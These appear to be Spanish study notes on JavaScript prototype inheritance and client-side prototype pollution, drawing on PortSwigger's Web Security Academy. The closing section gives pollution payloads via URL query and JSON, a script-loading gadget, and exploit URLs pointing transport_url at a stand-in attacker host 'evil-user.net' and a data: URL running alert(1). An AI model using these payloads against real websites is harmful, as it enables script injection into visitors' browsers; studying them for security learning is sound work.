---
title: "Theory"
---

# Theory

[JavaScript prototypes and inheritance | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)

Usando DOM invader :
[Client-side prototype pollution vulnerabilities | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-manually)
[Testing for client-side prototype pollution - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution)


Cada objeto en javascript está asignado a un objeto de otro tipo, por defecto :

```javascript
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Estos objetos heredan las propiedades de sus prototipos.
Si un objeto no tiene una propiedad, se mira en su prototipo.
Si creas un objeto vacío :

```javascript
let myObject = {};
```

Y miras sus propiedades, si que tendrá las propiedades de Object.prototype por defecto.

Para ver las propiedades de su prototipo:

```javascript
username.__proto__ 
username['__proto__']
```

```javascript
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

Se pueden crear :

```javascript
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}

let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```

___

URL :

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

```javascript
targetObject.__proto__.evilProperty = 'payload';
```

JSON:

Inyectar esto :
```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

```javascript
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
```

```javascript
objectFromJson.hasOwnProperty('__proto__'); // true
```

Ejemplo de un gadget :

```javascript
let transport_url = config.transport_url || defaults.transport_url;

let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
